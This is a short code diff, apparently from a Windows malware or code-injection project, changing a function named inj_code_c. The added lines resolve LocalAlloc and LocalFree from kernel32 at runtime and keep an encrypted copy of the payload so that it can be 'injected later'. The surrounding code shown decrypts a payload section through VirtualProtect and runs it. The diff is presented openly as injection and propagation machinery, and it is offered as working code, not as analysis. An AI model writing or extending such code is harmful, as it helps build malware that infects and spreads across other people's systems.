@@ -19,8 +19,18 @@ INJECTED_CODE VOID inj_code_c() {
 
     CONST auto hKernel32Dll = GET_DLL(kernel32.dll);
     CONST auto pVirtualProtect = GET_FUNC(hKernel32Dll, VirtualProtect);
+    CONST auto pLocalAlloc = GET_FUNC(hKernel32Dll, LocalAlloc);
+    CONST auto pLocalFree = GET_FUNC(hKernel32Dll, LocalFree);
 
     CONST SIZE_T dwPayloadEncSize = &__payload_end - &__payload_enc_start;
+
+    // Make a copy of the encrypted payload before decrypting it, so we can inject it later
+    CONST HLOCAL hPayloadData = pLocalAlloc(LMEM_FIXED, code_size);
+    if (hPayloadData == NULL) {
+        return;
+    }
+
+    my_memcpy((PBYTE)hPayloadData, &__payload_start, code_size);
 
     // Make the payload section writable
     DWORD dwOldProtect;
@@ -32,5 +42,8 @@ INJECTED_CODE VOID inj_code_c() {
     // Restore the original protection
     pVirtualProtect(&__payload_enc_start, dwPayloadEncSize, dwOldProtect, &dwOldProtect);
 
-    run_payload(hKernel32Dll);
+    run_payload(hKernel32Dll, (PCBYTE)hPayloadData);
+
+    // Free the allocated memory
+    pLocalFree(hPayloadData);
 }
